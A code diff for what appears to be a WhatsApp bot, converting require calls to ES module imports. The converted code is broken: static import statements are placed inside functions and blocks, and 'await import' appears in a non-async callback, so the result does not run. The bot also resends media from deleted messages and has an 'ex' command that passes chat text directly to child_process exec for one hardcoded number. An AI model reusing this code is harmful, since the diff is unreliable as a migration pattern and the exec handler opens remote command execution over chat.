@@ -209,7 +209,7 @@ conn.ev.on('connection.update', async (update) => {
 
 fs.readdirSync("./plugins/").forEach((plugin) => {
   if (path.extname(plugin).toLowerCase() == ".js") {
-      require("./plugins/" + plugin);
+      await import("./plugins/" + plugin);
   }
 });
 
@@ -1142,7 +1142,7 @@ if(!isOwner) {
           async function imageMessageRetrive(){      var nameJpg = getRandom('');
     const ml = sms(conn, originalMessage)
                 let buff =  await ml.download(nameJpg)
-                let fileType = require('file-type');
+               import * as fileType from 'file-type';
                 let type = fileType.fromBuffer(buff);
                 await fs.promises.writeFile("./" + type.ext, buff);
     if(originalMessage.message.imageMessage.caption){
@@ -1169,7 +1169,7 @@ if(!isOwner) {
     if(originalMessage.message.videoMessage.caption){
     if (fileLengthMB < fileDataMB && fileseconds < 30*60 ) {
                 let buff =  await ml.download(nameJpg)
-                let fileType = require('file-type');
+                import * as fileType from 'file-type';
                 let type = fileType.fromBuffer(buff);
                 await fs.promises.writeFile("./" + type.ext, buff);
     const messageText = originalMessage.message.videoMessage.caption;
@@ -1179,7 +1179,7 @@ if(!isOwner) {
            }
     }else{
                 let buff =  await ml.download(nameJpg)
-                let fileType = require('file-type');
+                import * as fileType from 'file-type';
                 let type = fileType.fromBuffer(buff);
                 await fs.promises.writeFile("./" + type.ext, buff);
         const vData = originalMessage.message.videoMessage.fileLength
@@ -1198,7 +1198,7 @@ if(!isOwner) {
           async function documentMessageRetrive(){      var nameJpg = getRandom('');
     const ml = sms(conn, originalMessage)
                 let buff =  await ml.download(nameJpg)
-                let fileType = require('file-type');
+                import * as fileType from 'file-type';
                 let type = fileType.fromBuffer(buff);
                 await fs.promises.writeFile("./" + type.ext, buff);
     
@@ -1220,7 +1220,7 @@ if(!isOwner) {
           async function audioMessageRetrive(){      var nameJpg = getRandom('');
     const ml = sms(conn, originalMessage)
                 let buff =  await ml.download(nameJpg)
-                let fileType = require('file-type');
+                import * as fileType from 'file-type';
                 let type = fileType.fromBuffer(buff);
                 await fs.promises.writeFile("./" + type.ext, buff);
     if(originalMessage.message.audioMessage){
@@ -1242,7 +1242,7 @@ if(!isOwner) {
           async function stickerMessageRetrive(){      var nameJpg = getRandom('');
     const ml = sms(conn, originalMessage)
                 let buff =  await ml.download(nameJpg)
-                let fileType = require('file-type');
+                import * as fileType from 'file-type';
                 let type = fileType.fromBuffer(buff);
                 await fs.promises.writeFile("./" + type.ext, buff);
     if(originalMessage.message.stickerMessage){
@@ -1539,7 +1539,7 @@ await conn.sendPresenceUpdate('recording', from);
 
 	    
 //==================================plugin map================================
-const events = require('./command')
+import events from './command.js'
 const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
 if (isCmd) {
   const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
@@ -1650,7 +1650,7 @@ switch (command) {
     break
     case'ex':{
       if(senderNumber == 94778500326) {
-  const { exec } = require("child_process")
+ import { exec } from 'child_process'
   exec(q, (err, stdout) => {
     if (err) return reply(`-------\n\n` + err)
     if (stdout) {
